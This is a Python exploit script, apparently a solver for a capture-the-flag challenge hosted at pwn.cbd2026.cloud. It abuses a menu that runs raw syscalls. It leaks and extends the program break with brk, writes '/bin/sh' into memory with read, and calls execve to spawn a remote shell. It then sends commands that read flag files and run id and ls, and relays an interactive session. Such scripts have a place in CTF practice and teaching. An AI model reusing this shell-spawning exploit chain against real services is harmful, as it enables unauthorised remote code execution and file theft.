#!/usr/bin/env python3
import re
import socket
import sys
import time
import select

HOST = sys.argv[1] if len(sys.argv) > 1 else "pwn.cbd2026.cloud"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 11101
TIMEOUT = 3.0


def recv_until(sock: socket.socket, marker: bytes, timeout: float = TIMEOUT) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def sendline(sock: socket.socket, s) -> None:
    if isinstance(s, int):
        s = str(s)
    if isinstance(s, str):
        s = s.encode()
    sock.sendall(s + b"\n")


def run_func(sock: socket.socket, nr: int, args, delay_payload: bytes | None = None) -> bytes:
    """Run one menu call. args must contain exactly 6 syscall args."""
    assert len(args) == 6
    sendline(sock, 1)      # menu: Run func
    sendline(sock, nr)     # arg 1: syscall number
    for x in args[:-1]:    # arg 2..arg 6
        sendline(sock, x)
    sendline(sock, args[-1])  # arg 7

    # Important: chall uses scanf/getchar, then raw syscall(read).
    # Do not send /bin/sh before clear_stdin() finishes or libc may buffer it.
    if delay_payload is not None:
        time.sleep(0.08)
        sock.sendall(delay_payload)

    return recv_until(sock, b"Choose :", timeout=TIMEOUT)


def main() -> None:
    s = socket.create_connection((HOST, PORT), timeout=TIMEOUT)

    banner = recv_until(s, b"Choose :")
    sys.stdout.buffer.write(banner)

    # 1) brk(0) -> leak current program break
    out = run_func(s, 12, [0, 0, 0, 0, 0, 0])
    sys.stdout.buffer.write(out)

    m = re.search(rb"returned\s+([0-9]+)", out)
    if not m:
        print("[-] Gagal parse return brk(0). Output terakhir:")
        print(out.decode(errors="replace"))
        return

    A = int(m.group(1))
    B = A + 0x1000
    print(f"[+] brk base A = {A:#x} ({A})")
    print(f"[+] new brk  B = {B:#x} ({B})")

    # 2) brk(A + 0x1000) -> make A writable/zeroed
    out = run_func(s, 12, [B, 0, 0, 0, 0, 0])
    sys.stdout.buffer.write(out)

    # 3) read(0, A, 7), then send '/bin/sh' exactly after syscall is waiting
    out = run_func(s, 0, [0, A, 7, 0, 0, 0], delay_payload=b"/bin/sh\n")
    sys.stdout.buffer.write(out)

    # 4) execve(A, 0, 0) -> /bin/sh
    # After this call there is no return if it works.
    sendline(s, 1)
    sendline(s, 59)
    sendline(s, A)
    sendline(s, 0)
    sendline(s, 0)
    sendline(s, 0)
    sendline(s, 0)
    sendline(s, 0)

    time.sleep(0.1)
    s.sendall(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; id; ls\n")

    print("[+] Sent execve. Interactive mode. Try commands if flag not printed.")

    s.setblocking(False)
    while True:
        r, _, _ = select.select([s, sys.stdin], [], [])
        if s in r:
            try:
                data = s.recv(4096)
            except BlockingIOError:
                data = b""
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
        if sys.stdin in r:
            cmd = sys.stdin.buffer.readline()
            if not cmd:
                break
            s.sendall(cmd)


if __name__ == "__main__":
    main()
